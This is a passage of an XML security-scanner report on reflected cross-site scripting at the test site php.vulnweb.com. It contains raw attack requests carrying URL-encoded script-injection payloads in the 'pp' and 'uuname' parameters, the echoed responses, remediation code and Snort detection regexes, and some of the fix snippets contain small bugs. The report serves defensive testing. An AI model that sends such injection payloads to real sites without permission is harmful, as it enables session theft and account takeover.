While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).</li><li>Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. </li></ul>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />

View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.


The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 



Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />
Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 

verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 

to convert it to a numeric data type in your programming language. <br /><br /><b>PHP:</b> intval("0".$_GET['q']);   <br /><br /><b>ASP.NET:</b> 

int.TryParse(Request.QueryString["q"], out val); <br /><br />

The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 

text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 

value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. <br /><br />

Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 

These should be used to sanitize all input before it is displayed to the client. <br /><br /><b>PHP:</b>  string htmlspecialchars (string string 

[, int quote_style])<br /><br /><b>ASP.NET:</b> Server.HTMLEncode (strHTML String)



<br /><br />

When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 

sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 

all non-alphanumeric characters using hex (\xHH) encoding.<br /><br />

If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 

or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 

do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:<br /><br />

s = s.replace(/&amp;/g,'&amp;amp;').replace(/"/i,'&amp;quot;').replace(/&lt;/i,'&amp;lt;').replace(/&gt;/i,'&amp;gt;').replace(/'/i,'&amp;apos;')


<br /><br />

Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 

data for display should be done immediately before displaying it.

<b><br /><br />


For Security Operations:</b><br /><br />

Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 

selected character set, can help to prevent Cross-Site Scripting attacks. <br /><br />

Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 

protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 

EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. <br /><br />

An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 

Scripting. <br /><br /><b>Regex for a simple XSS attack:</b><br />
/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/ix <br /><br />

The above regular expression would be added into a new Snort rule as follows: <br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 

pcre:"/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) <br /><br /><b>Paranoid regex for 

XSS attacks:</b><br />
/((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/I <br /><br />

This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 

followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 

server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.

<br /><br /><b>For QA:</b><br /><br />


Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 

about manually testing your application for Cross-Site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><br /><b>OWASP Cross-Site Scripting Information</b><br /><a href="https://www.owasp.org/index.php/XSS">https://www.owasp.org/index.php/XSS</a><br /><br /><b>CERT</b><br /><a href="http://www.cert.org/advisories/CA-2000-02.html">http://www.cert.org/advisories/CA-2000-02.html</a><br /><br /><b>Apache</b><br /><a href="http://httpd.apache.org/info/css-security/apache_specific.html">http://httpd.apache.org/info/css-security/apache_specific.html</a><br /><br /><b>SecurityFocus.com</b><br /><a href="http://www.securityfocus.com/infocus/1768 ">http://www.securityfocus.com/infocus/1768 </a>]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Cross-Site Scripting occurs when dynamically generated web pages display input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, utilizing client-side validation of user supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[When successfully exploited, Cross-Site Scripting gives an attacker a method of taking control of the interaction between a user and a web site. On a simple site composed of static content, this might only lead to changing how pages display to a specific user. When the site is capable of accepting user input, such as login information, or allows users to make choices with real world implications such as transferring funds or accessing private data, Cross-Site Scripting presents its most serious threat. The most significant danger from a successful Cross-Site Scripting attack is that an attacker will be able to emulate the credentials of an actual user by gaining access to a user’s session cookie, thereby hijacking the user session and taking over the account. The FDIC has recently indicated that unauthorized access to checking accounts is the fastest growing form of identity theft. More often than not, these instances of account hijacking are due to the presence of Cross-site scripting vulnerabilities. When an attacker gains control on the user’s end, it then often becomes unnecessary to break into the server. By that point, he already has the means to acquire the information he needs.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[To carry out a Cross-Site Scripting attack, an attacker will create a URL that takes advantage of a Cross-Site Scripting flaw. The attacker must then find some way of getting a victim to visit this URL. This can be done in many ways, ranging from getting it listed in a search engine to exploiting weaknesses in mail clients that allow scripted content to be executed. Once the victim has used the Cross-Site Scripting URL, the attacker's malicious code will be executed on his or her system.  In other words, there is a lot of effort required up-front for these attacks to be successful.  However, the potential payoff makes that effort worthwhile more often than not.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. Validation can be done using standard ASP.NET Validation controls, or directly in your code. Do not attempt to sanitize input by removing script strings or characters, simply reject it. Always use as strict a pattern as you can possibly allow.<br /><br />
Encoding of output insures that any scriptable content is properly encoded for HTML before being sent to the client. This is done with the function HttpUtility.HtmlEncode, as shown in the following Label control sample:<br /><br />
	Label2.Text = HttpUtility.HtmlEncode(input)
<br /><br />Be sure to consider all paths that user input takes through your application. For instance, if data is entered by the user, stored in a database, and then redisplayed later, you must make sure it is properly encoded each time it is retrieved.If you must allow free-format text input, such as in a message board, and you wish to allow some HTML formatting to be used, you can handle this safely by explicitly allowing only a small list of safe tags. Here is an example of how to do this safely:<br /><br />
C# Example:<br /><br />
            StringBuilder sb = new StringBuilder(<br />
                HttpUtility.HtmlEncode(input)); <br />
            sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;"); <br />
            sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;"); <br />
            Response.Write(sb.ToString());<br /><br />

VB.NET Example: <br /><br />
        Dim sb As StringBuilder = New StringBuilder( _ <br />
                HttpUtility.HtmlEncode(input)) <br />
        sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;") <br />
        sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;") <br />
        Response.Write(sb.ToString())<br /><br />

The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure what is being returned is what is expected, and is valid. </li><li>Use client-side validation when adding extra functionality to user input checking in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered " &lt;script&gt;alertdocumentcookie( 'aaa') &lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response, so that they cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms as opposed to single-factor authentication. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the web, or given to you by an acquaintance) for use in your own code. </li></ul>
Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. These should be used to sanitize all input before displayed to the client. 
<br /><br />
ASP / ASP.NET: Server.HTMLEncode (strHTML String)<br /><br />]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the Web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure the data being returned is what is expected, and is valid. </li><li>When adding extra functionality to user-input checking, use client-side validation in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user-supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered "&lt;script&gt;alertdocumentcookie('aaa')&lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response. Encoding ensures that the characters cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms, such as requiring a token and password, as opposed to single-factor authentication, such as requiring only a password. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the Web or given to you by an acquaintance) for use in your own code. </li></ul>
The Java language does not have a built-in method to convert the value of the input variable into correct, non-interpretable HTML. The following code samples show two different ways of writing a utility method to sanitize all user input before displaying it back to the client. <br /><br /><br />
public static String HTMLEncode(String aTagFragment){ <br /><br />
  //make sure you replace &amp; first<br />
  aTagFragment = aTagFragment.replaceAll("&amp;", "&amp;amp;"); <br />
  aTagFragment = aTagFragment.replaceAll("&lt;", "&amp;lt;"); <br />
  aTagFragment = aTagFragment.replaceAll("&gt;", "&amp;gt;"); <br />
  aTagFragment = aTagFragment.replaceAll("\"", "&amp;quot;"); <br />
  aTagFragment = aTagFragment.replaceAll("'", "&amp;#39;"); <br />
  //replace backslash ‘\’ character<br />
  aTagFragment = aTagFragment.replaceAll("\\\\", "&amp;#92;"); <br /><br />
  return aTagFragment; <br />
}<br /><br />
public static String HTMLEncode(String aTagFragment){ <br />
  final StringBuffer result = new StringBuffer();<br />
  final StringCharacterIterator iterator = new StringCharacterIterator(aTagFragment); <br />
  char character = iterator.current();<br />
  while (character != StringCharacterIterator.DONE ){ <br />
   		if (character == '&lt;') { <br />
   			result.append("&amp;lt;"); <br />
   		} <br />
   		else if (character == '&gt;') { <br />
   			result.append("&amp;gt;"); <br />
   		} <br />
   		else if (character == '\"') { <br />
   			result.append("&amp;quot;"); <br />
   		} <br />
   		else if (character == '\'") { <br />
   			result.append("&amp;#39;"); <br />
   		} <br />
   		else if (character == '\\') { <br />
   			result.append("&amp;#92;"); <br />
   		} <br />
   		else if (character == '&amp;') { <br />
   			result.append("&amp;amp;"); <br />
   		} <br />
   		else { <br />
   			//the char is not a special one <br />
   			//add it to the result as is <br />
   			result.append(character); <br />
   		} <br />
   		character = iterator.next();<br />
   	} <br />
   	return result.toString();<br />
}]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="FED8314E6CA06B389F425FD32208661B"><![CDATA[GET /hpp/params.php?p=valid&pp=12%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%35%32%38%31%37%29%3c%2f%73%43%72%49%70%54%3e HTTP/1.1
Referer: http://php.vulnweb.com/hpp/?pp=12
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="FED8314E6CA06B389F425FD32208661B";PSID="7E5868DF25B3500324DE1088D5FB82C4";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="pp";AttackParamIndex="1";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="12%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2535%2532%2538%2531%2537%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="41";tt="40";
X-RequestManager-Memo: sid="31";smi="0";sc="1";ID="9975598b";
X-Request-Memo: ID="ada02971";sc="1";tid="41";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:51:52 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 36

valid12<sCrIpT>alert(52817)</sCrIpT>]]></RawResponse><Request id="FED8314E6CA06B389F425FD32208661B"><Method>GET</Method><Path>/hpp/</Path><File>params</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>p=valid&amp;pp=12%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%35%32%38%31%37%29%3c%2f%73%43%72%49%70%54%3e</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>p</Name><Value>valid</Value></Query><Query><Name>pp</Name><Value>12%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%35%32%38%31%37%29%3c%2f%73%43%72%49%70%54%3e</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/hpp/?pp=12</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="FED8314E6CA06B389F425FD32208661B";PSID="7E5868DF25B3500324DE1088D5FB82C4";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="pp";AttackParamIndex="1";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="12%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2535%2532%2538%2531%2537%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="41";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="31";smi="0";sc="1";ID="9975598b";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="ada02971";sc="1";tid="41";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[valid12<sCrIpT>alert(52817)</sCrIpT>]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:51:52 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>36</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="2365EB6104765CC0E13D102C9CFB79D0"><URL>http://php.vulnweb.com:80/secured/newuser.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>uuname</AttackParamDescriptor><Issues><Issue id="d4f5bc8c-eccc-440c-983b-17b89d3f9152"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><AttackHTTPRequest><![CDATA[POST /secured/newuser.php HTTP/1.1
Referer: http://php.vulnweb.com/signup.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 242
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="2365EB6104765CC0E13D102C9CFB79D0";PSID="FAF765E4B6181822E8C9C961F9569838";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="uuname";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="12345%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2532%2536%2537%2536%2531%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="40";tt="40";
X-RequestManager-Memo: sid="29";smi="0";sc="1";ID="39839094";
X-Request-Memo: ID="c741737c";sc="1";tid="40";
Cookie: CustomCookie=WebInspect0

uuname=12345%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%32%36%37%36%31%29%3c%2f%73%43%72%49%70%54%3e&upass=foo&upass2=foo&urname=12345&ucc=12345&uemail=John.Doe%40somewhere.com&uphone=770&uaddress=1707%20Interdimensional%20Street&signup=signup]]></AttackHTTPRequest><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting</Name><Classifications><Classification kind="CWE" identifier="CWE-80" href="http://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="Cross-Site Scripting: Reflected" href="https://vulncat.fortify.com/">Cross-Site Scripting: Reflected</Classification></Classifications><DetectionSelection><Location offset="769" length="29" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<drc_fortify /><hp-img src="xss.rgc" /><br /><drc_xssrf />A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. <br /><br />

The implications of successful Cross-Site Scripting attacks are:

<ul><li>Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. </li><li>Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 

</li><li>Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
</li><li>Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.</li><li>	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . </li><li>Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. </li><li>	Manipulation of user settings - Attackers can change user settings for nefarious purposes. </li><li>Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. </li><li>Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.</li><li>Link prefetch injection: While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).</li><li>Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. </li></ul>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />

View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.


The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 



Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />
Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 

verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 

to convert it to a numeric data type in your programming language. <br /><br /><b>PHP:</b> intval("0".$_GET['q']);   <br /><br /><b>ASP.NET:</b> 

int.TryParse(Request.QueryString["q"], out val); <br /><br />

The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 

text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 

value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. <br /><br />

Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 

These should be used to sanitize all input before it is displayed to the client. <br /><br /><b>PHP:</b>  string htmlspecialchars (string string 

[, int quote_style])<br /><br /><b>ASP.NET:</b> Server.HTMLEncode (strHTML String)



<br /><br />

When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 

sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 

all non-alphanumeric characters using hex (\xHH) encoding.<br /><br />

If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 

or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 

do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:<br /><br />

s = s.replace(/&amp;/g,'&amp;amp;').replace(/"/i,'&amp;quot;').replace(/&lt;/i,'&amp;lt;').replace(/&gt;/i,'&amp;gt;').replace(/'/i,'&amp;apos;')


<br /><br />

Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 

data for display should be done immediately before displaying it.

<b><br /><br />


For Security Operations:</b><br /><br />

Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 

selected character set, can help to prevent Cross-Site Scripting attacks. <br /><br />

Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 

protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 

EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. <br /><br />

An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 

Scripting. <br /><br /><b>Regex for a simple XSS attack:</b><br />
/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/ix <br /><br />

The above regular expression would be added into a new Snort rule as follows: <br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 

pcre:"/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) <br /><br /><b>Paranoid regex for 

XSS attacks:</b><br />
/((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/I <br /><br />

This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 

followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 

server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.

<br /><br /><b>For QA:</b><br /><br />


Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 

about manually testing your application for Cross-Site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><br /><b>OWASP Cross-Site Scripting Information</b><br /><a href="https://www.owasp.org/index.php/XSS">https://www.owasp.org/index.php/XSS</a><br /><br /><b>CERT</b><br /><a href="http://www.cert.org/advisories/CA-2000-02.html">http://www.cert.org/advisories/CA-2000-02.html</a><br /><br /><b>Apache</b><br /><a href="http://httpd.apache.org/info/css-security/apache_specific.html">http://httpd.apache.org/info/css-security/apache_specific.html</a><br /><br /><b>SecurityFocus.com</b><br /><a href="http://www.securityfocus.com/infocus/1768 ">http://www.securityfocus.com/infocus/1768 </a>]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Cross-Site Scripting occurs when dynamically generated web pages display input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, utilizing client-side validation of user supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact 